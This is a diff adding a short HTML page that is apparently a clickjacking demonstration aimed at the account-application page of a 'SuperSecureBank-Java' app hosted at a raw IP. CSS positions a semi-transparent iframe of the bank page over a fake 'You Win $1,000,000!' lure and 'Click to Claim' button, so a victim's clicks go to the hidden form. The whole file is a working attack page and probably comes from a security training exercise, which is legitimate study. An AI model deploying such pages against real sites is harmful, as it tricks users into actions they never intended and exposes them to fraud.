@@ -1,0 +1,43 @@
+<html>
+    <head>
+        <title></title>
+        <style type="text/css" media="screen">
+            iframe{
+                opacity:.5;
+                z-index:100;
+                clear:none;
+                overflow:none;
+                float:left;
+                left: 100px;
+                top: -33px;
+                position: absolute;
+            }
+
+            #button{
+                position:absolute;
+                top:400px;
+                left:100px;
+                 z-index: -100;
+            }
+
+            #win{
+                position:absolute;
+                margin-top:350px;
+            }
+
+            img{
+                display:block;
+                float:left;
+                width:40%;
+                margin-top:50px;
+                z-index: -200;
+            }
+        </style>
+    </head>
+    <body>
+        <iframe src="http://52.5.175.6/SuperSecureBank-Java/applyForAccount.jsp" scrolling="no" width="500px" height="500px"></iframe>
+        <h1 id="win">You Win $1,000,000! </h1>
+        <button name="button" id="button"> Click to Claim</button>
+        <img src="http://i.giphy.com/cBTuHHvv5iqac.gif" alt="winner!"/>
+    </body>
+</html>
